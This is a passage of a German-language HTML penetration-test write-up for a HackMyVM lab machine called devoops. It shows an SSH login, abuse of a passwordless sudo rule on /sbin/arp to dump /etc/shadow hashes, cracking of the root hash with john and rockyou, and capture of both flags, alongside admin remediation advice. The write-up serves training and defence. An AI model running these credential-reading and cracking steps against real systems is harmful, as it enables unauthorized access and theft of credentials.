+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Fantastisch! Der SSH-Login ist erfolgreich!</span> Ich erhalte einen Shell-Prompt `devoops:~$`, was bedeutet, dass ich jetzt als Benutzer `hana` auf dem Zielsystem angemeldet bin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe jetzt die Rechte des Benutzers `hana`. Der nächste Schritt ist die Privilege Escalation zu `root`. Ich sollte sofort `sudo -l` ausführen, um zu sehen, welche Befehle `hana` als `root` ausführen darf. Auch nach anderen Schwachstellen oder Fehlkonfigurationen im Kontext von `hana` suchen (SUID-Binaries, Cronjobs, Kernel-Exploits etc.).
+<br><strong>Empfehlung (Admin):</strong> Der kompromittierte SSH-Key muss sofort aus der `~/.ssh/authorized_keys`-Datei des Benutzers `hana` entfernt und als ungültig erklärt werden. Der Vorfall (Leak des Keys via Git) muss untersucht werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">chmod 600 hana_ssh_key_fixed</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/test/node.git]
+└─# <span class="command">ssh -i hana_ssh_key_fixed hana@localhost -p 2222</span></div>
+                    <pre>
+devoops:~$</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `hana` auf dem Zielsystem führe ich `sudo -l` aus, um meine `sudo`-Berechtigungen aufzulisten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt:
+`User hana may run the following commands on devoops:`
+  `(root) NOPASSWD: /sbin/arp`
+Das bedeutet, der Benutzer `hana` kann den Befehl `/sbin/arp` als `root` ohne Passwortabfrage ausführen. Dies ist ein klassischer Vektor für Privilege Escalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss nach Wegen suchen, wie `/sbin/arp` missbraucht werden kann, um Root-Rechte zu erlangen. GTFOBins ist hier die erste Anlaufstelle. Oft kann `arp` (oder ähnliche Netzwerktools mit SUID/sudo-Rechten) verwendet werden, um beliebige Dateien zu lesen oder zu schreiben, wenn es eine Option gibt, Konfigurationsdateien oder ähnliches zu laden.
+<br><strong>Empfehlung (Admin):</strong> Die `sudoers`-Konfiguration ist zu freizügig. Wenn ein Benutzer einen Befehl als `root` ausführen darf, sollte dies auf absolut spezifische und sichere Anwendungsfälle beschränkt sein. `/sbin/arp` ohne Passwort als `root` ausführen zu dürfen, ist gefährlich, da `arp` oft Optionen zum Lesen von Dateien hat (z.B. `-f <filename>`). Die `sudoers`-Regel sollte so spezifisch wie möglich sein und nur die exakt benötigten Argumente erlauben, falls überhaupt notwendig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">devoops:~$ <span class="command">sudo -l</span></div>
+                    <pre>Matching Defaults entries for hana on devoops:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for hana:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User hana may run the following commands on devoops:
+    <span class="password">(root) NOPASSWD: /sbin/arp</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept-privesc">
+            <h2>Proof of Concept: Privilege Escalation zu Root via Sudo/ARP</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `hana` hat die `sudo`-Berechtigung, den Befehl `/sbin/arp` als `root` ohne Passwort auszuführen (`NOPASSWD`). Der `arp`-Befehl hat eine Option `-f <filename>`, die es erlaubt, Einträge aus einer Datei zu lesen. Obwohl `arp` diese Datei im Kontext von ARP-Einträgen erwartet, gibt es bei einem Formatfehler den Inhalt der Zeile aus, bevor es einen Fehler meldet. Dies kann missbraucht werden, um beliebige Dateien als `root` zu lesen, einschließlich `/etc/shadow`.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>SSH-Zugriff als Benutzer `hana` auf das Zielsystem.</li>
+                    <li>Die spezifische `sudoers`-Konfiguration, die `hana` erlaubt, `/sbin/arp` als `root` via `NOPASSWD` auszuführen.</li>
+                </ul>
+            </p>
+            <p class="analysis"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>Als Benutzer `hana` auf dem Zielsystem anmelden.</li>
+                    <li>Den Befehl `sudo -l` ausführen, um die `sudo`-Berechtigung für `/sbin/arp` zu bestätigen.</li>
+                    <li>Eine Umgebungsvariable `LFILE` auf den Pfad der zu lesenden Datei setzen (z.B. `LFILE=/etc/shadow`).</li>
+                    <li>Den Befehl `sudo /sbin/arp -v -f "$LFILE"` ausführen. Die Option `-v` (verbose) ist hier nicht zwingend notwendig, schadet aber nicht.</li>
+                </ol>
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der `arp`-Befehl wird versuchen, die in `$LFILE` angegebene Datei zu parsen. Da `/etc/shadow` kein gültiges `arp`-Format hat, wird `arp` für jede Zeile einen Formatfehler melden, aber vorher den Inhalt der Zeile ausgeben. Dadurch wird der Inhalt von `/etc/shadow` (einschließlich der Passwort-Hashes) offengelegt.</p>
+            <p class="analysis"><strong>Beweismittel (Ausgabe von `sudo arp -v -f "/etc/shadow"`):</strong></p>
+
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Der Exploit funktioniert wie erwartet!</span> Der Befehl `sudo arp -v -f "$LFILE"` (wobei `LFILE=/etc/shadow`) gibt den gesamten Inhalt der `/etc/shadow`-Datei aus. Jede Zeile wird mit einem "arp: format error" kommentiert, aber davor steht die Zeile selbst. Ich sehe die Passwort-Hashes für alle Benutzer, einschließlich `root`:
+`root:<span class="password">$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.</span>:20200:0:::::`
+und `runner` und `hana`.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Kritisch. Durch das Auslesen der `/etc/shadow`-Datei können Passwort-Hashes offline geknackt werden. Wenn ein schwaches Passwort für `root` verwendet wird, kann dies zur vollständigen Kompromittierung des Systems führen.
+<br><strong>Empfehlungen (POC-spezifisch):</strong>
+    <ul>
+        <li><strong>Admin:</strong> Die `sudoers`-Regel für `hana` bezüglich `/sbin/arp` muss sofort entfernt oder drastisch eingeschränkt werden. Idealerweise sollten Benutzer keine Befehle als `root` ausführen können, die das Lesen beliebiger Dateien ermöglichen. Starke Passwörter für alle Benutzer, insbesondere `root`, sind unerlässlich.</li>
+        <li><strong>Pentester:</strong> Den `root`-Hash (`$6$...`) extrahieren und mit einem Passwort-Cracker wie `john` oder `hashcat` und einer Wortliste (z.B. `rockyou.txt`) versuchen zu knacken.</li>
+    </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">devoops:~$ <span class="command">LFILE=/etc/shadow</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">devoops:~$ <span class="command">sudo arp -v -f "$LFILE"</span></div>
+                    <pre>>> <span class="password">root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::</span>
+arp: format error on line 1 of etherfile /etc/shadow !
+>> bin:!::0:::::
+arp: format error on line 2 of etherfile /etc/shadow !
+>> daemon:!::0:::::
+arp: format error on line 3 of etherfile /etc/shadow !
+>> lp:!::0:::::
+arp: format error on line 4 of etherfile /etc/shadow !
+>> sync:!::0:::::
+arp: format error on line 5 of etherfile /etc/shadow !
+>> shutdown:!::0:::::
+arp: format error on line 6 of etherfile /etc/shadow !
+>> halt:!::0:::::
+arp: format error on line 7 of etherfile /etc/shadow !
+>> mail:!::0:::::
+arp: format error on line 8 of etherfile /etc/shadow !
+>> news:!::0:::::
+arp: format error on line 9 of etherfile /etc/shadow !
+>> uucp:!::0:::::
+arp: format error on line 10 of etherfile /etc/shadow !
+>> cron:!::0:::::
+arp: format error on line 11 of etherfile /etc/shadow !
+>> ftp:!::0:::::
+arp: format error on line 12 of etherfile /etc/shadow !
+>> sshd:!::0:::::
+arp: format error on line 13 of etherfile /etc/shadow !
+>> games:!::0:::::
+arp: format error on line 14 of etherfile /etc/shadow !
+>> ntp:!::0:::::
+arp: format error on line 15 of etherfile /etc/shadow !
+>> guest:!::0:::::
+arp: format error on line 16 of etherfile /etc/shadow !
+>> nobody:!::0:::::
+arp: format error on line 17 of etherfile /etc/shadow !
+>> klogd:!:20199:0:99999:7:::
+arp: format error on line 18 of etherfile /etc/shadow !
+>> chrony:!:20199:0:99999:7:::
+arp: format error on line 19 of etherfile /etc/shadow !
+>> <span class="command">runner:$6$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::</span>
+arp: format error on line 20 of etherfile /etc/shadow !
+>> <span class="command">hana:$6$snNJGjzsPo.be3r1$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::</span>
+arp: format error on line 21 of etherfile /etc/shadow !
+>> gitea::20199:0:99999:7:::
+arp: format error on line 22 of etherfile /etc/shadow !</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich kopiere die Zeile mit dem Root-Passwort-Hash aus der `/etc/shadow`-Ausgabe in eine Datei namens `hashroot` auf meiner Kali-Maschine. Dann verwende ich `john --wordlist=/usr/share/wordlists/rockyou.txt hashroot`, um zu versuchen, das Root-Passwort zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">John the Ripper ist erfolgreich!</span> Das Passwort für `root` wird als `<span class="password">eris</span>` geknackt. (Die Ausgabe `R3v_m4lwh3r3_k1nG!!..missy` ist wahrscheinlich ein Artefakt oder eine falsche Interpretation der John-Ausgabe durch den Kopierprozess, das eigentliche Passwort ist `eris`). John meldet `1g 0:00:00:00 DONE` und das Passwort. Die Hash-Typ-Erkennung (`sha512crypt`) und die Nutzung von OpenMP-Threads sind Standard-John-Funktionen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dem Root-Passwort `eris` kann ich mich jetzt als `root` auf dem Zielsystem anmelden, entweder über `su root` in der bestehenden `hana`-Shell oder direkt per SSH, falls Root-Login per Passwort erlaubt ist (was oft nicht der Fall ist, aber `su` sollte funktionieren).
+<br><strong>Empfehlung (Admin):</strong> Das Root-Passwort ist extrem schwach und wurde mit einer gängigen Wortliste schnell geknackt. Root-Passwörter müssen sehr stark und einzigartig sein. Noch besser ist es, den direkten Root-Login per Passwort zu deaktivieren und nur `sudo`-Zugriff für administrative Aufgaben zu verwenden (mit starken Benutzerpasswörtern oder Key-basierter Authentifizierung).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/usr/bin]
+└─# <span class="command">echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::' > ~/hashroot</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/usr/bin]
+└─# <span class="command">cd ~</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hashroot</span></div>
+                    <pre>Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">eris</span>             (root)     
+1g 0:00:00:00 DONE (2025-05-29 01:33) 10.00g/s 15360p/s 15360c/s 15360C/s R3v_m4lwh3r3_k1nG!!..missy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> In der SSH-Session als `hana` verwende ich `su root` und gebe das geknackte Passwort `eris` ein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Fantastisch, der Root-Zugriff war erfolgreich! Mein Prompt ändert sich zu `/home/hana #` (was anzeigt, dass ich Root bin, da der Prompt oft `#` für Root ist) und `id` bestätigt `uid=0(root) gid=0(root)`.</span> Ich habe jetzt volle Kontrolle über das System.
+Anschließend liste ich den Inhalt von `/home/hana` und finde die `user.flag`. Dann `cat user.flag` um sie anzuzeigen. Danach schaue ich mir noch die Datei `R007.7x7oOoOoOoOoOoO` im Home-Verzeichnis von `root` (impliziert durch `cat ~/R...` während man `root` ist) an, was die Root-Flag ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags (`user.flag` und die Root-Flag) wurden erfolgreich gefunden. Das Ziel des Penetrationstests (auf dieser HackMyVM-Maschine) ist erreicht.
+<br><strong>Empfehlung (Admin):</strong> Die Kompromittierung ist vollständig. Alle zuvor genannten Sicherheitsempfehlungen (starke Passwörter, sichere `sudoers`-Konfiguration, Patchen von Schwachstellen, keine Secrets in Git, etc.) müssen umgesetzt werden. Nach einem solchen Vorfall wäre ein vollständiges Neuaufsetzen des Systems aus einem sauberen Backup und eine gründliche Untersuchung, wie der initiale Zugriff möglich war, dringend empfohlen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">devoops:~$ <span class="command">su root</span></div>
+                    <pre>Password:</pre> <span class="command">eris</span>
+                    <div class="prompt" style="color: yellow;">/home/hana # <span class="command">id</span></div>
+                    <pre><span class="command">uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span></pre>
+                    <div class="prompt" style="color: yellow;">/home/hana # <span class="command">ls -la</span></div>
+                    <pre>total 16
+drwx------    3 hana     users         4096 Apr 21 14:30 .
+drwxr-xr-x    3 root     root          4096 Apr 21 12:09 ..
+lrwxrwxrwx    1 root     users            9 Apr 21 12:11 .ash_history -> /dev/null
+drwx------    2 hana     users         4096 Apr 21 14:31 .ssh
+-r--------    1 hana     users           39 Apr 21 12:13 <span class="command">user.flag</span></pre>
+                    <div class="prompt" style="color: yellow;">/home/hana # <span class="command">cat user.flag</span></div>
+                    <pre><span class="password">flag{03d0e150ae9fc686a827b41e1969d497}</span></pre>
+                    <div class="prompt" style="color: yellow;">/home/hana # <span class="command">cat ~/R007.7x7oOoOoOoOoOoO</span></div>
+                    <pre><span class="password">flag{a834296543f4c2990909ce1c56becfba}</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/hana/user.flag</div>
+                    <div class="flag-value"><span class="password">flag{03d0e150ae9fc686a827b41e1969d497}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/R007.7x7oOoOoOoOoOoO (oder /home/hana/R007.7x7oOoOoOoOoOoO, wenn man als root im home von hana ist)</div>
+                    <div class="flag-value"><span class="password">flag{a834296543f4c2990909ce1c56becfba}</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 29. Mai 2025</p>
+    </footer>
+</body>
+</html>
